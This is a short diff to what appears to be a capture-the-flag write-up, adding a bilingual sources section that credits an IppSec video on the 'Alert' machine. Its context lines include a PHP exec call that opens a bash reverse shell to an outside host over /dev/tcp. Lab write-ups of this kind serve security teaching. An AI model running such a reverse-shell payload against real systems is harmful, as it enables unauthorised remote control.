@@ -191,3 +191,7 @@ exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.16.10/443 0>&1"');
 ?>
 ```
 Finally, we get the reverse shell.
+
+## Fuentes / Sources
+
+- [IppSec: Alert (video)](https://youtube.com/watch?v=zSBEfW46zd0) - IppSec - fecha de acceso: 2026-09-24.
